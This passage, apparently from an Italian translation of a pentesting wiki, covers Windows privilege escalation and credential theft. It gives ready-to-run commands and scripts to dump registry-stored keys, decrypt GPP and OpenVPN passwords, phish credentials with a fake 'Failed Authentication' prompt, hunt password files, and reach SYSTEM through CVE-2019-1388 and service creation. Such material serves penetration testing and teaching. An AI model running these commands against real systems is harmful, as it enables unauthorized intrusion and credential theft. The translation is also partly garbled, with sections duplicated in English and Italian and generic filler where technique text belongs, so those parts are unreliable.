Se si verifica un cambiamento nella chiave host del server, Putty avviserà l'utente e chiederà se si desidera continuare la connessione. Questo avviso è importante perché potrebbe indicare un attacco di tipo "man-in-the-middle" o un cambiamento legittimo nella chiave host del server.

Per visualizzare le chiavi host memorizzate nel file delle chiavi host di Putty, è possibile aprire il file con un editor di testo o utilizzare il comando `regedit` per accedere al registro di sistema di Windows.

Le chiavi host sono organizzate per server e vengono visualizzate come stringhe di caratteri esadecimali. Ogni chiave host ha un identificatore univoco che corrisponde all'indirizzo IP o al nome del server remoto.

È importante prestare attenzione alle chiavi host memorizzate nel file delle chiavi host di Putty e verificare che corrispondano alle chiavi host dei server a cui ci si è connessi in passato. In caso di dubbi sulla validità di una chiave host, è consigliabile contattare l'amministratore di sistema del server remoto per confermare l'autenticità della chiave.
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Chiavi SSH nel registro

Le chiavi private SSH possono essere memorizzate all'interno della chiave del registro `HKCU\Software\OpenSSH\Agent\Keys`, quindi è consigliabile verificare se ci sono informazioni interessanti al suo interno:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Se trovi una voce all'interno di quel percorso, probabilmente si tratta di una chiave SSH salvata. Viene memorizzata in forma crittografata ma può essere facilmente decifrata utilizzando [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract).\
Ulteriori informazioni su questa tecnica qui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Se il servizio `ssh-agent` non è in esecuzione e desideri avviarlo automaticamente all'avvio, esegui:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Sembra che questa tecnica non sia più valida. Ho provato a creare alcune chiavi ssh, aggiungerle con `ssh-add` e accedere tramite ssh a una macchina. Il registro HKCU\Software\OpenSSH\Agent\Keys non esiste e procmon non ha identificato l'uso di `dpapi.dll` durante l'autenticazione con chiave asimmetrica.
{% endhint %}

### File non assistiti
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Puoi anche cercare questi file utilizzando **metasploit**: _post/windows/gather/enum\_unattend_

Contenuto di esempio:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Copie di backup di SAM e SYSTEM

Le copie di backup dei file SAM e SYSTEM sono estremamente utili per l'escalation dei privilegi locali su sistemi Windows. Questi file contengono informazioni sensibili come le password degli account locali e le chiavi di crittografia.

Per ottenere le copie di backup di questi file, è possibile utilizzare diverse tecniche, come:

- Utilizzare strumenti di terze parti come Mimikatz per estrarre le informazioni dai file di backup.
- Utilizzare il servizio di ripristino di emergenza di Windows per accedere ai file di backup.
- Utilizzare strumenti come Volume Shadow Copy per copiare i file di backup in una posizione accessibile.

Una volta ottenute le copie di backup di SAM e SYSTEM, è possibile utilizzare strumenti come Mimikatz per estrarre le password degli account locali e utilizzarle per ottenere privilegi elevati sul sistema.

È importante notare che l'accesso ai file di backup di SAM e SYSTEM richiede privilegi di amministratore o privilegi di sistema. Pertanto, queste tecniche sono generalmente utilizzate durante un test di penetrazione o in situazioni in cui si dispone di autorizzazioni appropriate per accedere ai file di sistema sensibili.
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenziali Cloud

Cloud credentials are the authentication details used to access cloud services and resources. These credentials typically include a username and password, API keys, access tokens, or other forms of authentication. It is important to protect cloud credentials as they grant access to sensitive data and resources within the cloud environment.

Le credenziali cloud sono i dettagli di autenticazione utilizzati per accedere ai servizi e alle risorse cloud. Queste credenziali includono tipicamente un nome utente e una password, chiavi API, token di accesso o altre forme di autenticazione. È importante proteggere le credenziali cloud in quanto consentono l'accesso a dati sensibili e risorse all'interno dell'ambiente cloud.
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Cerca un file chiamato **SiteList.xml**

### Password GPP memorizzate nella cache

In precedenza era disponibile una funzionalità che consentiva la distribuzione di account amministrativi locali personalizzati su un gruppo di macchine tramite le Preferenze di criteri di gruppo (GPP). Tuttavia, questo metodo presentava significative vulnerabilità di sicurezza. In primo luogo, gli Oggetti di criteri di gruppo (GPO), archiviati come file XML in SYSVOL, potevano essere accessibili da qualsiasi utente di dominio. In secondo luogo, le password all'interno di questi GPP, crittografate con AES256 utilizzando una chiave predefinita pubblicamente documentata, potevano essere decifrate da qualsiasi utente autenticato. Ciò rappresentava un grave rischio, in quanto poteva consentire agli utenti di ottenere privilegi elevati.

Per mitigare questo rischio, è stata sviluppata una funzione per cercare file GPP memorizzati in cache che contengono un campo "cpassword" non vuoto. Una volta trovato un tale file, la funzione decifra la password e restituisce un oggetto PowerShell personalizzato. Questo oggetto include dettagli sul GPP e sulla posizione del file, facilitando l'identificazione e la risoluzione di questa vulnerabilità di sicurezza.

Cerca in `C:\ProgramData\Microsoft\Group Policy\history` o in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (precedente a W Vista)_ questi file:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Per decifrare la cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Utilizzando crackmapexec per ottenere le password:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config

Il file di configurazione web (Web.config) è un file di configurazione utilizzato da Internet Information Services (IIS) per definire le impostazioni specifiche di un'applicazione web. Questo file contiene direttive che influenzano il comportamento dell'applicazione, come le impostazioni di autenticazione, le regole di routing e le autorizzazioni degli utenti.

Il file Web.config può essere utilizzato anche per migliorare la sicurezza dell'applicazione web. È possibile configurare diverse impostazioni per proteggere l'applicazione da attacchi e vulnerabilità comuni. Alcune delle impostazioni di sicurezza che possono essere configurate nel file Web.config includono:

- Impostazioni di autenticazione: è possibile specificare quali metodi di autenticazione sono consentiti per l'applicazione web. Ad esempio, è possibile richiedere l'autenticazione tramite nome utente e password o tramite certificato client.

- Impostazioni di autorizzazione: è possibile definire quali utenti o gruppi di utenti hanno accesso alle risorse dell'applicazione web. È possibile limitare l'accesso solo a determinati utenti o consentire l'accesso solo a determinati ruoli.

- Impostazioni di crittografia: è possibile configurare l'applicazione web per utilizzare la crittografia SSL/TLS per proteggere la comunicazione tra il client e il server. È possibile specificare quali protocolli di crittografia sono supportati e quali algoritmi di crittografia vengono utilizzati.

- Impostazioni di gestione degli errori: è possibile configurare l'applicazione web per gestire gli errori in modo sicuro. Ad esempio, è possibile visualizzare un messaggio di errore generico anziché fornire informazioni dettagliate sull'errore che potrebbero essere utilizzate da un potenziale attaccante.

- Impostazioni di protezione dei file: è possibile configurare l'applicazione web per proteggere i file sensibili. Ad esempio, è possibile impedire l'accesso diretto ai file di configurazione o ai file di log dell'applicazione.

Configurare correttamente il file Web.config è essenziale per garantire la sicurezza dell'applicazione web. È importante comprendere le diverse impostazioni di sicurezza disponibili e configurarle in base alle esigenze specifiche dell'applicazione.
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Esempio di web.config con credenziali:

```xml
<configuration>
  <appSettings>
    <add key="DatabaseUsername" value="admin" />
    <add key="DatabasePassword" value="password123" />
  </appSettings>
</configuration>
```

Questo è un esempio di file web.config che contiene credenziali sensibili. Nel blocco `<appSettings>`, le credenziali per l'accesso al database sono specificate utilizzando le chiavi "DatabaseUsername" e "DatabasePassword". Assicurarsi di proteggere adeguatamente questo file per evitare eventuali accessi non autorizzati alle credenziali.
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenziali OpenVPN

To establish a connection with an OpenVPN server, you will need the following credentials:

- **Username**: The username provided by the OpenVPN server administrator.
- **Password**: The password associated with your OpenVPN account.

These credentials are necessary to authenticate and authorize your access to the OpenVPN network. Make sure to keep them secure and avoid sharing them with unauthorized individuals.

### Credenziali OpenVPN

Per stabilire una connessione con un server OpenVPN, avrai bisogno delle seguenti credenziali:

- **Username**: Lo username fornito dall'amministratore del server OpenVPN.
- **Password**: La password associata al tuo account OpenVPN.

Queste credenziali sono necessarie per autenticare e autorizzare il tuo accesso alla rete OpenVPN. Assicurati di mantenerle al sicuro e di evitare di condividerle con persone non autorizzate.
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Registri

I registri sono una fonte preziosa di informazioni per gli hacker. Possono contenere dettagli sulle attività di sistema, gli errori, le interazioni degli utenti e altro ancora. I registri possono essere utilizzati per identificare vulnerabilità e punti deboli nel sistema, nonché per tracciare le azioni degli utenti e le attività sospette. Gli hacker possono sfruttare i registri per ottenere informazioni sensibili, come password o dati di accesso, o per eseguire attacchi di escalation dei privilegi. È importante monitorare e proteggere i registri per prevenire potenziali violazioni della sicurezza.
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Richiedi le credenziali

Puoi sempre **chiedere all'utente di inserire le sue credenziali o anche le credenziali di un utente diverso** se pensi che possa conoscerle (nota che **chiedere** direttamente al cliente le **credenziali** è davvero **rischioso**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Possibili nomi di file contenenti credenziali**

File noti che in passato contenevano **password** in **testo in chiaro** o **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Cerca tutti i file proposti:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenziali nel Cestino

Dovresti anche controllare il Cestino per cercare credenziali al suo interno.

Per **recuperare le password** salvate da vari programmi puoi utilizzare: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### All'interno del registro di sistema

**Altre possibili chiavi di registro con credenziali**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Estrai le chiavi openssh dal registro.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Cronologia dei browser

Dovresti controllare i database in cui sono memorizzate le password di **Chrome o Firefox**.\
Controlla anche la cronologia, i segnalibri e i preferiti dei browser perché potrebbero essere memorizzate alcune **password**.

Strumenti per estrarre le password dai browser:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Sovrascrittura DLL COM**

**Component Object Model (COM)** è una tecnologia integrata nel sistema operativo Windows che consente l'**intercomunicazione** tra componenti software di diversi linguaggi. Ogni componente COM è **identificato tramite un ID di classe (CLSID)** e ogni componente espone funzionalità tramite una o più interfacce, identificate tramite ID di interfaccia (IID).

Le classi e le interfacce COM sono definite nel registro sotto **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** e **HKEY\_**_**CLASSES\_**_**ROOT\Interface** rispettivamente. Questo registro viene creato unendo **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

All'interno delle CLSID di questo registro è possibile trovare il registro figlio **InProcServer32** che contiene un **valore predefinito** che punta a una **DLL** e un valore chiamato **ThreadingModel** che può essere **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single o Multi) o **Neutral** (Thread Neutral).

![](<../../.gitbook/assets/image (638).png>)

In sostanza, se puoi **sovrascrivere una delle DLL** che verranno eseguite, potresti **aumentare i privilegi** se quella DLL verrà eseguita da un utente diverso.

Per scoprire come gli attaccanti utilizzano il dirottamento COM come meccanismo di persistenza, consulta:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Ricerca generica delle password nei file e nel registro**

**Cerca il contenuto dei file**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Cerca un file con un determinato nome di file**

Puoi utilizzare il comando `dir` per cercare un file con un determinato nome di file. Ecco come farlo:

```plaintext
dir /s /b "nomefile"
```

- Il flag `/s` indica a `dir` di cercare in modo ricorsivo all'interno di tutte le sottocartelle.
- Il flag `/b` indica a `dir` di mostrare solo il percorso completo del file corrispondente.

Assicurati di sostituire "nomefile" con il nome effettivo del file che stai cercando.
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Cerca nel registro di sistema i nomi delle chiavi e le password**

Puoi cercare nel registro di sistema di Windows per trovare nomi di chiavi e password che potrebbero essere utili per l'escalation dei privilegi locali. Ecco alcuni passaggi che puoi seguire:

1. Apri il prompt dei comandi come amministratore.
2. Esegui il comando `reg query HKLM /f "password" /t REG_SZ /s` per cercare nel registro di sistema tutte le chiavi che contengono la parola "password".
3. Esegui il comando `reg query HKCU /f "password" /t REG_SZ /s` per cercare nel registro di sistema dell'utente corrente tutte le chiavi che contengono la parola "password".
4. Esegui il comando `reg query HKLM /f "keyname" /t REG_SZ /s` per cercare nel registro di sistema tutte le chiavi che contengono la parola "keyname".
5. Esegui il comando `reg query HKCU /f "keyname" /t REG_SZ /s` per cercare nel registro di sistema dell'utente corrente tutte le chiavi che contengono la parola "keyname".

Questi comandi ti aiuteranno a individuare potenziali informazioni sensibili nel registro di sistema di Windows che potrebbero essere utilizzate per l'escalation dei privilegi locali.
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Strumenti che cercano password

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) è un plugin di **msf** che ho creato per **eseguire automaticamente ogni modulo POST di metasploit che cerca credenziali** all'interno della vittima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) cerca automaticamente tutti i file che contengono password menzionate in questa pagina.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) è un altro ottimo strumento per estrarre password da un sistema.

Lo strumento [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) cerca **sessioni**, **nomi utente** e **password** di diversi strumenti che salvano questi dati in chiaro (PuTTY, WinSCP, FileZilla, SuperPuTTY e RDP).
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Gestori trapelati

Immagina che **un processo in esecuzione come SYSTEM apra un nuovo processo** (`OpenProcess()`) con **accesso completo**. Lo stesso processo **crea anche un nuovo processo** (`CreateProcess()`) **con privilegi bassi ma ereditando tutti i gestori aperti del processo principale**.\
Quindi, se hai **accesso completo al processo a bassi privilegi**, puoi ottenere il **gestore aperto del processo privilegiato creato** con `OpenProcess()` e **iniettare un shellcode**.\
[Leggi questo esempio per ulteriori informazioni su **come rilevare e sfruttare questa vulnerabilità**.](leaked-handle-exploitation.md)\
[Leggi questo **altro post per una spiegazione più completa su come testare e sfruttare più gestori aperti di processi e thread ereditati con diversi livelli di autorizzazioni (non solo accesso completo)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Impersonazione del client di Named Pipe

I segmenti di memoria condivisa, chiamati **pipe**, consentono la comunicazione tra processi e il trasferimento di dati.

Windows fornisce una funzionalità chiamata **Named Pipes**, che consente a processi non correlati di condividere dati, anche su reti diverse. Questo assomiglia a un'architettura client/server, con ruoli definiti come **named pipe server** e **named pipe client**.

Quando i dati vengono inviati attraverso una pipe da un **client**, il **server** che ha creato la pipe ha la possibilità di **assumere l'identità** del **client**, a condizione che abbia i necessari diritti di **SeImpersonate**. Identificando un **processo privilegiato** che comunica tramite una pipe che puoi imitare, hai l'opportunità di **ottenere privilegi più elevati** assumendo l'identità di quel processo una volta che interagisce con la pipe che hai stabilito. Per istruzioni su come eseguire un attacco del genere, puoi trovare guide utili [**qui**](named-pipe-client-impersonation.md) e [**qui**](./#from-high-integrity-to-system).

Inoltre, lo strumento seguente consente di **intercettare una comunicazione di named pipe con uno strumento come burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e questo strumento consente di elencare e visualizzare tutte le pipe per trovare privesc** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Varie

### **Monitoraggio delle righe di comando per le password**

Quando si ottiene una shell come utente, potrebbero essere in esecuzione attività pianificate o altri processi che **passano le credenziali sulla riga di comando**. Lo script seguente cattura le righe di comando dei processi ogni due secondi e confronta lo stato corrente con lo stato precedente, visualizzando eventuali differenze.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Da Utente con Privilegi Bassi a NT\AUTHORITY SYSTEM (CVE-2019-1388) / Bypass UAC

Se hai accesso all'interfaccia grafica (tramite console o RDP) e UAC è abilitato, in alcune versioni di Microsoft Windows è possibile eseguire un terminale o qualsiasi altro processo come "NT\AUTHORITY SYSTEM" da un utente non privilegiato.

Ciò rende possibile l'elevazione dei privilegi e il bypass di UAC contemporaneamente con la stessa vulnerabilità. Inoltre, non è necessario installare nulla e il binario utilizzato durante il processo è firmato e rilasciato da Microsoft.

Alcuni dei sistemi interessati sono i seguenti:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Per sfruttare questa vulnerabilità, è necessario eseguire i seguenti passaggi:

```
1) Fare clic con il pulsante destro del mouse sul file HHUPD.EXE e eseguirlo come amministratore.

2) Quando compare la finestra di dialogo UAC, selezionare "Mostra altri dettagli".

3) Fare clic su "Mostra informazioni sul certificato dell'editore".

4) Se il sistema è vulnerabile, facendo clic sul link URL "Rilasciato da", potrebbe apparire il browser web predefinito.

5) Attendere il completo caricamento del sito e selezionare "Salva come" per visualizzare una finestra di esplora risorse.

6) Nella barra degli indirizzi della finestra di esplora risorse, digitare cmd.exe, powershell.exe o qualsiasi altro processo interattivo.

7) Ora si avrà un prompt dei comandi "NT\AUTHORITY SYSTEM".

8) Ricordarsi di annullare l'installazione e la finestra di dialogo UAC per tornare al desktop.
```

Tutti i file e le informazioni necessarie sono disponibili nel seguente repository GitHub:

https://github.com/jas502n/CVE-2019-1388

## Da Medium a High Integrity Level / Bypass UAC

Leggi questo per **apprendere informazioni sui livelli di integrità**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Quindi **leggi questo per apprendere informazioni su UAC e i bypass di UAC:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **Da High Integrity a System**

### **Nuovo servizio**

Se si sta già eseguendo un processo ad alta integrità, il **passaggio a SYSTEM** può essere semplice creando ed eseguendo un nuovo servizio:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Da un processo ad alta integrità, puoi provare ad **abilitare le voci del registro AlwaysInstallElevated** e **installare** una reverse shell utilizzando un _**.msi**_ wrapper.\
[Ulteriori informazioni sulle chiavi di registro coinvolte e su come installare un pacchetto _.msi_ qui.](./#alwaysinstallelevated)

### Privilegio High + SeImpersonate per System

**Puoi** [**trovare il codice qui**](seimpersonate-from-high-to-system.md)**.**

### Da SeDebug + SeImpersonate a privilegi Token completi

Se hai quei privilegi token (probabilmente li troverai in un processo già ad alta integrità), sarai in grado di **aprire quasi tutti i processi** (tranne i processi protetti) con il privilegio SeDebug, **copiare il token** del processo e creare un **processo arbitrario con quel token**.\
Usando questa tecnica, di solito viene **selezionato un processo in esecuzione come SYSTEM con tutti i privilegi token** (_sì, è possibile trovare processi SYSTEM senza tutti i privilegi token_).\
**Puoi trovare un** [**esempio di codice che esegue la tecnica proposta qui**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Questa tecnica viene utilizzata da meterpreter per l'escalation in `getsystem`. La tecnica consiste nel **creare una pipe e quindi creare/sfruttare un servizio per scrivere su quella pipe**. Successivamente, il **server** che ha creato la pipe utilizzando il privilegio **`SeImpersonate`** sarà in grado di **impersonare il token** del client della pipe (il servizio) ottenendo i privilegi di SYSTEM.\
Se vuoi [**saperne di più sulle named pipes, dovresti leggere questo**](./#named-pipe-client-impersonation).\
Se vuoi leggere un esempio di [**come passare da alta integrità a System utilizzando le named pipes, dovresti leggere questo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se riesci a **hijackare una dll** che viene **caricata** da un **processo** in esecuzione come **SYSTEM**, sarai in grado di eseguire codice arbitrario con quei permessi. Pertanto, il Dll Hijacking è anche utile per questo tipo di escalation dei privilegi e, inoltre, è **molto più facile da ottenere da un processo ad alta integrità** poiché avrà **permessi di scrittura** sulle cartelle utilizzate per caricare le dll.\
**Puoi** [**saperne di più sul Dll hijacking qui**](dll-hijacking.md)**.**

### **Da Amministratore o Network Service a System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Da LOCAL SERVICE o NETWORK SERVICE a privilegi completi

**Leggi:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Ulteriori aiuti

[Binari impacket statici](https://github.com/ropnop/impacket\_static\_binaries)

## Strumenti utili

**Il miglior strumento per cercare vettori di escalation dei privilegi locali di Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Verifica le configurazioni errate e i file sensibili (**[**controlla qui**](../../windows/windows-local-privilege-escalation/broken-reference/)**). Rilevato.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Verifica alcune possibili configurazioni errate e raccoglie informazioni (**[**controlla qui**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Verifica le configurazioni errate**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Estrae informazioni sulle sessioni salvate di PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Usa -Thorough in locale.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Estrae credenziali da Credential Manager. Rilevato.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spruzza le password raccolte in tutto il dominio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh è uno strumento PowerShell per lo spoofing di ADIDNS/LLMNR/mDNS/NBNS e per l'intercettazione del traffico.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumerazione di base di Windows per l'escalation dei privilegi**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Cerca vulnerabilità di escalation dei privilegi conosciute (DEPRECATA per Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Controlli locali **(Necessita di diritti di amministratore)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Cerca vulnerabilità di escalation dei privilegi conosciute (deve essere compilato usando VisualStudio) ([**precompilato**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
